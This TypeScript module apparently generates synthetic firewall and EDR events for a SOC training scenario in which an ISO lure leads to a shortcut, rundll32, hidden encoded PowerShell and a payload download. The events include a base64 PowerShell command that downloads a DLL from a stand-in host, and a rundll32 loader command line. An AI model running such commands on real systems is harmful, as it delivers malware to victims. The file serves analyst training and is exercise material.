/**
 * Events-only half of the ./isoContainerSmuggling.ts scenario pack.
 *
 * The dashboard's live feed runs in the browser (attackStories.ts), so what it
 * imports ships in a public /_next/static chunk. The answer key (questions,
 * answers, explanations, IOCs, killchain, narrative) stays in the builder in
 * ./isoContainerSmuggling.ts, which composes this module on the server. Keep anything
 * answer-bearing out of this file: every visitor can read it.
 */
import type { TelemetryEvent } from "@/lib/sim/types";
import { makeSha256 } from "@/lib/sim/iocs";
import { fgWeb } from "@/lib/sim/emitters/fortigate";
import { csFile, csProcess, csAlert } from "@/lib/sim/emitters/crowdstrike";

/** Telemetry half of `buildIsoContainerSmugglingScenario`: the events and the story title, no answer key. */
export function isoContainerSmugglingScenarioEvents() {
  const B = new Date("2026-04-14T10:05:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const host = { hostname: "LAP-5528", ip: "10.14.33.91" };
  const victim = { email: "n.katz@nexacorp.com", name: "Noa Katz", sam: "n.katz" };

  const shareSite = "invoice-doc-share.net";
  const c2 = "cdn-update-relay.net";

  const isoHash = makeSha256("invoice_84421_iso_container_smuggling_2026");
  const payloadHash = makeSha256("cdn_update_relay_core_dll_payload_2026");

  // EDR↔scenario integration (Phase 4): one incident. Endpoint-primary → edr_scope
  // "edr" (the firewall download/fetch are transport evidence). The Falcon
  // DetectionSummaryEvent is the alert that opens the ticket; the critical
  // encoded-PowerShell detection is the behavioural crux.
  const INCIDENT = "inc:ics:1";

  const cxN = "nexacorp" as const;

  const events: TelemetryEvent[] = [
    // 0. Delivery — she opened the link in a phishing email; the browser loads the lure page.
    fgWeb({
      companyId: cxN, id: "evt_ics_00_lure_click", ts: T(-90_000), host: host.hostname, srcIp: host.ip, user: victim.email,
      userTitle: "Accounts Payable Clerk", incidentId: INCIDENT, severity: "low",
      subtype: "webfilter", eventtype: "ftgd_allow", action: "passthrough", logid: "0316013056", level: "notice",
      msg: "URL belongs to an allowed category", category: "Newly Registered Domains", categoryId: "92",
      url: `https://${shareSite}/invoice/84421`, domain: shareSite, remoteIp: "104.21.61.90",
      bytesIn: 18_204, policyId: 14, mitre: "T1566.002", tactic: "Initial Access",
      description: "LAP-5528 opened https://invoice-doc-share.net/invoice/84421 at 10:03:30 (the link from a phishing email), passed through under Newly Registered Domains.",
    }),
    // 1. The download. An ISO, not an executable — FortiGate's file-filter logs it (not a block).
    fgWeb({
      companyId: cxN, id: "evt_ics_01_download", ts: T(0), host: host.hostname, srcIp: host.ip, user: victim.email,
      userTitle: "Accounts Payable Clerk", incidentId: INCIDENT, severity: "low",
      subtype: "filefilter", eventtype: "filefilter", action: "log-only", logid: "0211008192", level: "warning",
      msg: "File filter event", url: `https://${shareSite}/dl/Invoice_84421.iso`, domain: shareSite, remoteIp: "104.21.61.90",
      bytesIn: 7_129_088, file: { name: "Invoice_84421.iso", sha256: isoHash, size: 7_129_088, type: "iso" }, policyId: 14,
      description: "LAP-5528 downloaded Invoice_84421.iso, 6.8 MB, from invoice-doc-share.net at 10:05, logged by the file-filter profile as log-only.",
    }),
    // 2. The ISO lands, carrying a Mark-of-the-Web tag (Zone.Identifier ZoneId=3, Internet).
    csFile({
      companyId: cxN, id: "evt_ics_02_file_write", ts: T(6_000), host: host.hostname, srcIp: host.ip, user: victim.email,
      path: "C:\\Users\\n.katz\\Downloads\\Invoice_84421.iso", sha256: isoHash, size: 7_129_088, action: "file_create",
      actorProcess: "chrome.exe", actorPid: 6204, actorPath: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
      severity: "low", incidentId: INCIDENT,
      description: "chrome.exe wrote C:\\Users\\n.katz\\Downloads\\Invoice_84421.iso at 10:05:06, tagged with a Zone.Identifier alternate data stream (ZoneId=3, Internet) — the Mark-of-the-Web Windows applies to anything downloaded from the web.",
    }),
    // 3. She double-clicks it — explorer.exe mounts the ISO as drive D:\ (FileOpenInfo).
    //    Since the Nov-2022 patch (CVE-2022-41091) Windows propagates the ISO's MotW to the
    //    files inside the mounted volume, so update.dat and the .lnk are themselves tagged.
    csFile({
      companyId: cxN, id: "evt_ics_03_mount", ts: T(4 * MIN + 20_000), host: host.hostname, srcIp: host.ip, user: victim.email,
      path: "C:\\Users\\n.katz\\Downloads\\Invoice_84421.iso", sha256: isoHash, action: "file_access",
      actorProcess: "explorer.exe", actorPid: 3184, actorPath: "C:\\Windows\\explorer.exe", actorIntegrity: "medium",
      mitre: "T1204.002", tactic: "Execution", severity: "medium", incidentId: INCIDENT,
      description: "At 10:09:20 explorer.exe opened Invoice_84421.iso. Windows' container-mount handler presented it as drive D:\\, exposing Invoice_84421.lnk and update.dat — both now carrying the propagated Mark-of-the-Web.",
    }),
    // 4. THE EVENT THAT MATTERS — the .lnk targets a signed LOLBin (rundll32) to load the
    //    bundled update.dat. A Mark-of-the-Web .lnk shows a SmartScreen/Open-File warning;
    //    the user clicked through it (T1204.002), and SmartScreen does not re-gate a trusted
    //    signed Windows binary once it runs.
    csProcess({
      companyId: cxN, id: "evt_ics_04_lnk_cmd", ts: T(4 * MIN + 34_000), host: host.hostname, srcIp: host.ip, user: victim.email,
      processName: "rundll32.exe", processPath: "C:\\Windows\\System32\\rundll32.exe",
      cmdline: "rundll32.exe D:\\update.dat,Start",
      parentName: "explorer.exe", parentPid: 3184, pid: 6620, signed: true,
      mitre: "T1218.011", tactic: "Stealth", severity: "high", incidentId: INCIDENT,
      description: "Fourteen seconds later she opened Invoice_84421.lnk on D:\\. Windows showed the Open File - Security Warning for the Mark-of-the-Web .lnk; she chose Run anyway, and the shortcut ran rundll32.exe against D:\\update.dat, the data file bundled in the ISO.",
    }),
    // 5. THE CRUX — the loaded update.dat spawns a hidden, encoded PowerShell (alert-grade).
    csProcess({
      companyId: cxN, id: "evt_ics_05_powershell", ts: T(4 * MIN + 35_000), host: host.hostname, srcIp: host.ip, user: victim.email,
      processName: "powershell.exe", processPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      cmdline: "powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAGMAZABuAC0AdQBwAGQAYQB0AGUALQByAGUAbABhAHkALgBuAGUAdAAvAG0AbwBkAC8AYwBvAHIAZQAuAGQAbABsACcALAAnAEMAOgBcAFUAcwBlAHIAcwBcAG4ALgBrAGEAdAB6AFwAQQBwAHAARABhAHQAYQBcAFIAbwBhAG0AaQBuAGcAXABjAG8AcgBlAC4AZABsAGwAJwApAA==",
      parentName: "rundll32.exe", parentPid: 6620, pid: 6631, isDetection: true,
      mitre: "T1059.001", tactic: "Execution", severity: "critical", incidentId: INCIDENT,
      description: "One second later rundll32.exe (hosting update.dat) spawned powershell.exe with a hidden window and a base64-encoded command.",
    }),
    // 6. The decoded command fetches the follow-on payload — passed through as Uncategorized.
    fgWeb({
      companyId: cxN, id: "evt_ics_06_payload_fetch", ts: T(4 * MIN + 37_000), host: host.hostname, srcIp: host.ip, user: victim.email,
      incidentId: INCIDENT, severity: "critical",
      subtype: "webfilter", eventtype: "ftgd_allow", action: "passthrough", logid: "0316013056", level: "notice",
      msg: "URL belongs to an allowed category", category: "Uncategorized", categoryId: "26",
      url: `https://${c2}/mod/core.dll`, domain: c2, remoteIp: "193.106.191.42", bytesIn: 2_516_582,
      file: { name: "core.dll", sha256: payloadHash, size: 2_516_582, type: "dll" }, policyId: 22,
      description: "Two seconds after PowerShell started, LAP-5528 fetched core.dll, 2.4 MB, from cdn-update-relay.net — a domain with no relationship to invoice-doc-share.net, passed through as an uncategorised URL.",
    }),
    // 7. It lands on disk — unsigned, written by the interpreter.
    csFile({
      companyId: cxN, id: "evt_ics_07_payload_write", ts: T(4 * MIN + 39_000), host: host.hostname, srcIp: host.ip, user: victim.email,
      path: "C:\\Users\\n.katz\\AppData\\Roaming\\core.dll", sha256: payloadHash, size: 2_516_582, action: "file_create", signed: false,
      actorProcess: "powershell.exe", actorPid: 6631, actorPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      severity: "high", incidentId: INCIDENT,
      description: "powershell.exe wrote C:\\Users\\n.katz\\AppData\\Roaming\\core.dll, unsigned, 2.4 MB.",
    }),
    // 8. Falcon catches up and kills the interpreter before core.dll loads (the ticket-opener).
    {
      ...csAlert({
        companyId: cxN, id: "evt_ics_08_edr_alert", ts: T(4 * MIN + 45_000), host: host.hostname, srcIp: host.ip, user: victim.email,
        threatName: "ContainerLnkRundll32SpawnedEncodedPowerShell", severity: "critical",
        detail: "A shortcut on a mounted ISO/IMG volume ran rundll32 against a bundled data file, which spawned PowerShell with a hidden window and an encoded download command.",
        mitre: "T1059.001", tactic: "Execution", technique: "Command and Scripting Interpreter: PowerShell",
        processTree: "explorer.exe > rundll32.exe > powershell.exe", action: "killed", incidentId: INCIDENT,
        description: "Falcon raised a Critical detection on LAP-5528 for the explorer -> rundll32 -> powershell chain originating from a mounted ISO volume, and killed the PowerShell process before core.dll could be loaded.",
      }),
      edr_scope: "edr",
    },
  ];

  // Every event belongs to the one incident.
  for (const e of events) e.incident_id = INCIDENT;

  return { title: "Invoice.iso — Container-Delivered LNK and LOLBin Chain", events, T, MIN, host, shareSite, c2, isoHash, payloadHash };
}
